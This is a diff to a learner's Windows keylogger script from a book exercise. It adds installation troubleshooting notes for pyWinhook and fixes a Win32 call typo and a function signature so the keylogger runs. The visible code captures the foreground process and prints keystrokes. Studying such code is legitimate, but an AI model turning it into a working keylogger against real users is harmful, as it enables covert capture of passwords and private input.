@@ -2,10 +2,14 @@
 '''
 Keylogging for Fun and Keystrokes (Windows)
 Page 128
-
+#########################################################################################
 Note: typo on page 129: code block on the top half of the page shows 8 spaces indent,
 should be 4 spaces (to continue get_current_process method)
 
+#########################################################################################
+Requires:  pythoncom, resolved with "pip3 install pypiwin32"
+
+#########################################################################################
 Requires: pyWinhook (https://pypi.org/project/pyWinhook/)
 
 Note: pyWinhook fails to install with error:
@@ -26,8 +30,20 @@ ERROR: Could not build wheels for pyWinhook, which is required to install pyproj
 Update: after "pip install swig", pyWinhook install fails with:
 
       swig.exe -python -o pyWinhook/cpyHook_wrap.c pyWinhook/cpyHook.i
-      error: Microsoft Visual C++ 14.0 or greater is required. Get it with "Microsoft C++ Build Tools": https://visualstudio.microsoft.com/visual-cpp-build-tools/
+      error: Microsoft Visual C++ 14.0 or greater is required. Get it with "Microsoft C++ Build Tools":
+      https://visualstudio.microsoft.com/visual-cpp-build-tools/
       [end of output]
+##############################################################################################
+After installing "Visual Studio Build Tools" on test machine: same error
+After insatlling "Visual Studio with C++"
+
+####################################################################################
+Error with swig.exe not found, even though 'scripts' was in the path.
+Resolved by running from directory where swig.exe is located ?
+
+$ cd ......\Python311\scripts
+$ pip install pyWinhook
+Successfully installed pyWinhook-1.6.2
 
 '''
 
@@ -48,7 +64,7 @@ class KeyLogger:
         self.current_window = None
 
     def get_current_process(self):
-        hwnd = windll.user32.GetForeGroundWindow()
+        hwnd = windll.user32.GetForegroundWindow()
         pid = c_ulong(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f'{pid.value}'
@@ -86,7 +102,7 @@ class KeyLogger:
                 print(f'{event.Key}')
         return True
 
-def run(self):
+def run():
     save_stdout = sys.stdout
     sys.stdout = StringIO()
     kl = KeyLogger()
